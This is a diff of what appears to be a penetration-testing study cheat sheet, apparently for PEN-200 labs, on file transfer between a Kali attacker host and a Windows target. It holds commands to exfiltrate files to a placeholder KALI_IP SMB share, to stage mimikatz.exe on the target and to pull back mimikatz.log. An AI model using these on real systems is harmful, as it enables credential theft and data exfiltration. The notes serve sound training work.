@@ -12,7 +12,7 @@ wget -r -np http://KALI_IP/linux/
 # ***Windows Target***
 ## xfreerdp
 ```shell
-# 1. Kali
+# 1 KALI
 xfreerdp /u:username /p:password /v:target_ip /drive:smb,$PWD +clipboard +smart-sizing 
 
 
@@ -23,19 +23,25 @@ cp \\tsclient\smb\FILE FILE
 # Exfil
 cp FILE \\tsclient\smb\.
 
+
 # For GUI: Go to NETWORK -> TSCLIENT and the share will be there
 ```
 ## impacket-smbserver
 ``` shell
-# 1 Kali
+# 1 KALI
 impacket-smbserver smb . -smb2support [ -username user -password pass ]
+
 
 # 2 Target
 net use z: \\KALI_IP\smb [ /user:user pass ]
 
-# From Target, download / upload
+# FROM TARGET
+# Download to TARGET
 cp z:\FILE FILE
+
+# Upload to KALO
 cp FILE z:\.
+
 
 # 3 Delete mapping after user
 net use z: /delete
@@ -51,14 +57,17 @@ lget mimikatz.log # Exfil (from C:\Windows\)
 # Upload
 upload mimikatz.exe C:\windows\tasks\mimikatz.exe
 
+
 # Exfil
 download mimikatz.log /home/kali/Documents/pen-200`
 ```
 ## winhttpserver.exe
 ```shell
+# 1 TARGET
 .\winhttpserver.exe -i -p PORT folder_name
 
-# access through Firefox
+# 2 KALI
+# Access through Firefox
 
 # https://github.com/TheWaWaR/simple-http-server
 ```
